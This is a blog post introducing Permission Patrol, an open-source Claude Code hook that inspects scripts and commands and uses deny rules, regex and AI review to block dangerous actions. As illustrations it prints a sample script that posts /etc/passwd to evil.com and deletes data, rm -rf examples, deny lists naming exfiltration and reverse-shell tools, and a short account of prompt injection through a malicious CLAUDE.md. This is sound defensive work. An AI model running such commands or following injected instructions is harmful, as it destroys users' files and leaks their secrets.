---
title: "Permission Patrol: An AI Security Guard for Claude Code"
date: 2026-02-06
excerpt: "Stop using --dangerously-skip-permissions. Permission Patrol is an open-source command hook that reads script content before Claude Code executes it — catching hidden rm -rf, data exfiltration, and prompt injection that prompt hooks can't see."
tags:
  - claude-code
  - ai-security
  - hooks
  - command-hook
  - python
  - open-source
  - dangerously-skip-permissions
  - prompt-injection
  - defense-in-depth
  - script-inspection
categories:
  - Projects
toc: true
toc_sticky: true
---

## Why `--dangerously-skip-permissions` Is Dangerous

Many developers run Claude Code with `--dangerously-skip-permissions` to avoid the constant permission prompts. It's tempting — no interruptions, fully autonomous coding. But you're giving an AI agent **unrestricted access** to your filesystem, network, and shell.

Here's what can go wrong:

- **Accidental file deletion.** Claude might run `rm -rf` on the wrong directory, or a script it generates calls `shutil.rmtree()` on a path outside your project. With no permission check, it just happens.
- **Prompt injection.** A malicious `CLAUDE.md` or a crafted file in a cloned repo can instruct Claude to exfiltrate your SSH keys, `.env` files, or source code. With `--dangerously-skip-permissions`, there's nothing stopping it.
- **Unreviewed scripts.** Claude generates and runs Python/Node/Bash scripts all the time. Without permission checks, you never see what's inside — even if the script contains `requests.post("https://evil.com", data=secrets)`.

The manual alternative isn't great either. Clicking "Allow" on every permission prompt means you're reviewing hundreds of requests per session. Most people stop reading after the first few — which means **long bash chains** and **innocent-looking script names** slip through without real scrutiny.

**Permission Patrol is the middle ground.** It auto-allows safe operations (zero latency), auto-denies known-dangerous patterns (zero cost), and uses AI review only for the ambiguous cases that actually need human-level judgment. You get security without the friction.

## The Problem: Claude Code Runs Scripts Blindly

[Claude Code](https://docs.anthropic.com/en/docs/claude-code) is an incredible tool for software development. It can write code, run tests, manage git, and execute scripts — all autonomously. But that power comes with a risk.

When Claude Code asks permission to run `python3 script.py`, you see the command string. You click "Allow." But what's actually inside that script?

```python
# script.py - looks innocent as a command
import shutil
shutil.rmtree("/home/user/important_data")  # Hidden danger
```

This is the gap I wanted to close. And it's not just scripts — there's another class of commands that's equally dangerous.

### Scenario 1: Long Chained Commands Nobody Has Time to Review

Claude Code often generates long, chained bash commands. When you see something like this in the permission prompt, do you really read every part?

```bash
cd /tmp && git clone https://github.com/some/repo.git && cd repo \
  && pip install -r requirements.txt && python3 setup.py build \
  && cp -r dist/* /usr/local/lib/ && chmod -R 755 /usr/local/lib/project \
  && systemctl restart app \
  && curl -X POST https://hooks.slack.com/services/T00/B00/xxx -d '{"text":"deployed"}' \
  && rm -rf /tmp/repo
```

Did you spot the `curl -X POST` exfiltrating data to an external webhook? Or the `rm -rf` buried at the very end? In a wall of `&&`-chained commands, dangerous operations hide in plain sight. Permission Patrol's regex engine catches both automatically — no AI call needed.

### Scenario 2: Innocent Script Hiding Dangerous Code

This is the more subtle problem. The command looks completely harmless:

```bash
python3 scripts/cleanup_cache.py
```

But `cleanup_cache.py` might contain:

```python
import shutil, requests

shutil.rmtree("/home/user/important_data")
requests.post("https://evil.com/exfil", data=open("/etc/passwd").read())
```

A standard permission hook only sees the command string `python3 scripts/cleanup_cache.py` — it has **no idea** what's inside the file. Permission Patrol reads the script content (up to 5KB) and sends it to Claude for AI security review.

## Why Prompt Hooks Fall Short

Claude Code supports [hooks](https://docs.anthropic.com/en/docs/claude-code/hooks) — custom logic that runs when permission is requested. There are two types:

- **Prompt hooks** (`type: "prompt"`): An LLM reviews the request. Simple to set up, but it **only sees the command string**. It sees `python3 script.py`, not what's inside the file.
- **Command hooks** (`type: "command"`): A script runs to make the decision. It can do anything — including **reading the file content**.

A prompt hook would happily approve `python3 script.py` because the command looks harmless. It has no way to know the script deletes your data.

## The Solution: Permission Patrol

[Permission Patrol](https://github.com/stillcuriouscat/permission-patrol) is a command hook that adds a multi-layer security review:

```
Request arrives
    |
    +-- settings.json deny? --> Reject (no API call)
    |   (rm -rf, curl POST, scp, gh repo delete...)
    |
    +-- settings.json allow? --> Pass (no API call)
    |   (git status, ls, Read, ruff, gh...)
    |
    +-- Neither? --> permission-guard.py hook
         |
         +-- Dangerous regex? --> Deny immediately
         |
         +-- Script execution? --> Read file, Claude reviews content
         |
         +-- Sensitive / outside project? --> Claude reviews, user decides
         |
         +-- Other cases? --> Claude reviews the request
```

### How the Hook Receives Requests

Claude Code sends a JSON object to the hook's stdin via the `PermissionRequest` event. The hook reads `tool_name`, `tool_input`, and `cwd` to understand what Claude wants to do:

```python
# Claude Code pipes this JSON to the hook's stdin
request = json.load(sys.stdin)
tool_name = request.get("tool_name", "")    # e.g. "Bash", "Write", "WebFetch"
tool_input = request.get("tool_input", {})  # e.g. {"command": "python3 script.py"}
cwd = request.get("cwd", "")               # working directory
```

### How the Hook Returns Decisions

The hook communicates back to Claude Code by printing JSON to stdout. Three possible decisions:

```python
# Allow — Claude Code proceeds without prompting the user
def allow():
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PermissionRequest",
            "decision": {"behavior": "allow"}
        }
    }))
    sys.exit(0)

# Deny — Claude Code blocks the action with a reason
def deny(reason: str):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PermissionRequest",
            "decision": {"behavior": "deny", "message": reason}
        }
    }))
    sys.exit(0)

# Ask user — exit 0 with NO JSON output
# Claude Code falls back to showing the standard permission dialog
def ask_user():
    sys.exit(0)  # no output = let user decide
```

### Deterministic Rules (Zero Cost)

Common operations are handled by `settings.json` allow/deny rules — no API call, no latency:

- **Deny**: `rm -rf`, `shred`, `curl POST`, `scp`, `gh repo delete`
- **Allow**: `git status`, `ls`, `Read`, `ruff`, `mypy`, `eslint`, trusted domains

The hook also has its own regex layer for patterns that slip past `settings.json` (e.g., `rm /home/...`, `dd of=/dev/`, reverse shell patterns).

### Script Content Inspection (The Key Feature)

When you run `python3 script.py`, `pytest`, or `node app.js`, the hook:

1. Detects the script execution pattern
2. **Reads the actual file content** (up to 5KB)
3. Sends both the command and script content to Claude for review
4. Claude checks for dangerous patterns: `shutil.rmtree`, `os.remove`, `requests.post`, code injection, etc.
5. Returns allow/deny/ask based on the analysis

Here's how the script content is injected into the review prompt — this is the part prompt hooks simply cannot do:

````python
# Detect script execution and read the file
script_match = re.search(
    r'\b(python|python3|node|bash|sh)\s+([^\s;|&]+)', command
)
if script_match:
    script_path = script_match.group(2)
    with open(script_full_path, "r") as f:
        script_content = f.read()[:5000]  # read up to 5KB

# Build the review prompt with script content included
prompt = f"""You are a security reviewer for Claude Code.

## Request Information
- Tool: {tool_name}
- Parameters: {json.dumps(tool_input)}

## Script Content
```
{script_content}
```

## Response Format (pure JSON)
{{"decision": "allow"}}
or {{"decision": "deny", "reason": "..."}}
or {{"decision": "ask", "reason": "..."}}
"""
````

### Calling Claude CLI (No API Key Required)

The hook calls Claude CLI in print mode, which uses your existing Claude Code subscription — no separate API key needed:

```python
result = subprocess.run(
    ["claude", "-p", prompt, "--model", "opus", "--output-format", "text"],
    capture_output=True, text=True, timeout=30
)
parsed = json.loads(result.stdout.strip())
decision = parsed["decision"]  # "allow", "deny", or "ask"
```

### Path-Aware Decisions

Even when Claude approves, the hook adds extra safety based on path classification:

- **Inside project directory**: Claude can auto-approve
- **Outside project / sensitive paths** (`~/.ssh`, `/etc/`, `.env`): User always has the final say — Claude's verdict is advisory only
- Desktop notification on Linux so you know Claude already reviewed it

## No API Key Required

Permission Patrol calls Claude CLI internally, which uses your Claude Code subscription quota. No separate API key, no extra cost setup. Just install and go.

## Getting Started

### 1. Clone the repo

```bash
git clone https://github.com/stillcuriouscat/permission-patrol.git
```

### 2. Merge permissions into your settings

Add the allow/deny rules from `permissions.json` to your `~/.claude/settings.json`:

```json
{
  "permissions": {
    "allow": [
      "Bash(git *)",
      "Bash(gh *)",
      "WebFetch(domain:github.com)"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(gh repo delete *)"
    ]
  }
}
```

### 3. Add the hook

```json
{
  "hooks": {
    "PermissionRequest": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "python3 /path/to/permission-patrol/permission-guard.py",
            "timeout": 30000
          }
        ]
      }
    ]
  }
}
```

### 4. Restart Claude Code

That's it. Permission Patrol is now guarding your sessions.

## What I Learned Building This

1. **Command hooks are underrated.** Most examples use prompt hooks, but command hooks can do so much more — read files, check network state, verify git status.

2. **Deterministic rules first, AI second.** Using `settings.json` rules for common patterns means zero latency and zero cost for 90% of operations. AI review is reserved for the ambiguous cases.

3. **Defense in depth.** No single check is perfect. Combining regex patterns, file content inspection, path checks, and AI review creates multiple layers of security.

## Frequently Asked Questions

### Does Permission Patrol work with `--dangerously-skip-permissions`?

No — and that's the point. `--dangerously-skip-permissions` disables **all** permission checks, including hooks. Permission Patrol is designed for normal mode, where it replaces the manual "Allow/Deny" workflow with automated, intelligent review. You get the speed of skip-permissions with the safety of human review.

### How is a command hook different from a prompt hook?

A **prompt hook** asks an LLM to review the command string (e.g., `python3 script.py`). A **command hook** runs a script that can do anything — including reading the actual file content before execution. Permission Patrol uses a command hook so it can inspect what's *inside* scripts, not just the command name.

### Does it require a separate API key?

No. Permission Patrol calls `claude` CLI internally, which uses your existing Claude Code subscription. No extra API key, no additional cost.

### What dangerous patterns does it catch?

Permission Patrol catches patterns in two layers:

- **Regex (instant, no AI):** `rm -rf`, `shred`, `curl POST`, `scp`, `wget`, `chmod 777`, data exfiltration commands
- **AI review (Claude):** `shutil.rmtree()`, `os.remove()`, `requests.post()`, obfuscated code, file system access outside the project, code injection patterns

### Does it slow down Claude Code?

Deterministic allow/deny rules add near-zero latency. AI review takes a few seconds via Claude CLI — only triggered for ambiguous cases like script execution or sensitive paths. In practice, 90%+ of operations are handled by deterministic rules instantly.

### Can I customize the allow/deny rules?

Yes. Edit the `permissions` section in your `~/.claude/settings.json`. Add patterns to `allow` for commands you trust, or `deny` for commands you want blocked. The rules use glob patterns like `Bash(git *)` or `Bash(rm -rf *)`.

## Links

- **GitHub**: [stillcuriouscat/permission-patrol](https://github.com/stillcuriouscat/permission-patrol)
- **Claude Code Hooks Docs**: [docs.anthropic.com](https://docs.anthropic.com/en/docs/claude-code/hooks)
- **License**: MIT — use it, fork it, improve it.

---

*If you're using Claude Code for development, give Permission Patrol a try. And if you find a dangerous pattern it doesn't catch, open an issue — security is a community effort.*
